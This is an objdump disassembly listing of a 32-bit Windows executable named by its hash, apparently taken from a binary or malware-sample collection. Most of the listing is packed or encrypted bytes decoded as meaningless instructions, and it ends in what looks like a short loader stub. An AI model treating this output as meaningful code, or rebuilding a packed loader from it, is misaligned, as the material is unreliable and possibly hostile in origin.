
4e3b4288c6eacc559b76cb86c7caf1f44beae471d8008370abf43c150cd898e0.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	inc    ebx
  4d0001:	test   DWORD PTR [ebp-0x1e339886],edi
  4d0007:	jmp    0x296f:0x7e83b43a
  4d000e:	push   edx
  4d000f:	push   0x6f306d40
  4d0014:	or     al,0x64
  4d0016:	enter  0x4511,0xf4
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	out    0xac,al
  4d06b3:	(bad)  [ecx+0x60245871]
  4d06b9:	xchg   edx,eax
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x74]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	cli    
  4d06c1:	sbb    eax,0x8f96699d
  4d06c6:	or     BYTE PTR [edi],ch
  4d06c8:	ins    DWORD PTR es:[edi],dx
  4d06c9:	in     al,0x77
  4d06cb:	call   0x5a94:0x2c1ffad6
  4d06d2:	jle    0x4d0688
  4d06d4:	mov    ah,0xbb
  4d06d6:	pop    eax
  4d06d7:	cwde   
  4d06d8:	(bad)  
  4d06d9:	push   cs
  4d06da:	push   ecx
  4d06db:	or     al,0x96
  4d06dd:	push   ebx
  4d06de:	mul    DWORD PTR [esi]
  4d06e0:	enter  0x7c43,0xce
  4d06e4:	jge    0x4d0703
  4d06e6:	loop   0x4d0733
  4d06e8:	jbe    0x4d0769
  4d06ea:	cld    
  4d06eb:	ins    BYTE PTR es:[edi],dx
  4d06ec:	pop    edi
  4d06ed:	call   DWORD PTR ds:0x4d2058
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [edi-0x1],bl
  4d06fa:	adc    eax,0x4d2088
  4d06ff:	call   edi
  4d0701:	add    BYTE PTR [eax],al
  4d0703:	add    BYTE PTR [edi-0x1],bl
  4d0706:	adc    eax,0x4d2020
  4d070b:	call   edi
  4d070d:	add    BYTE PTR [eax],al
  4d070f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0715:	sub    esp,0x2c
  4d0718:	mov    edx,0x4d31a8
  4d071d:	add    ebx,0x6a
  4d0720:	push   edx
  4d0721:	push   0x0
  4d0723:	call   0x4d14e8
  4d0728:	add    esp,0x4
  4d072b:	pop    edx
  4d072c:	push   edx
  4d072d:	push   DWORD PTR [edx+0x60]
  4d0730:	push   DWORD PTR [edx+0x1c8]
  4d0736:	call   0x4d12d4
  4d073b:	add    esp,0x8
  4d073e:	pop    edx
  4d073f:	mov    eax,0x4d204c
  4d0744:	mov    eax,DWORD PTR [eax]
  4d0746:	push   eax
  4d0747:	push   DWORD PTR [edx+0x3c]
  4d074a:	pop    ecx
  4d074b:	call   ecx
  4d074d:	add    esp,0x2c
  4d0750:	pop    ebp
  4d0751:	ret    
  4d0752:	add    BYTE PTR [eax],al
  4d0754:	mov    edi,edi
  4d0756:	push   ebp
  4d0757:	mov    ebp,esp
  4d0759:	sub    esp,0x60
  4d075c:	lea    eax,[ebx+0xb4]
  4d0762:	or     ebx,eax
  4d0764:	push   eax
  4d0765:	push   ecx
  4d0766:	push   ebx
  4d0767:	push   DWORD PTR [eax+0x7c]
  4d076a:	push   esi
  4d076b:	call   0x4d1440
  4d0770:	add    esp,0x10
  4d0773:	pop    eax
  4d0774:	push   eax
  4d0775:	push   0x0
  4d0777:	call   0x4d0798
  4d077c:	add    esp,0x4
  4d077f:	pop    eax
  4d0780:	push   eax
  4d0781:	mov    edx,0x0
  4d0786:	push   edx
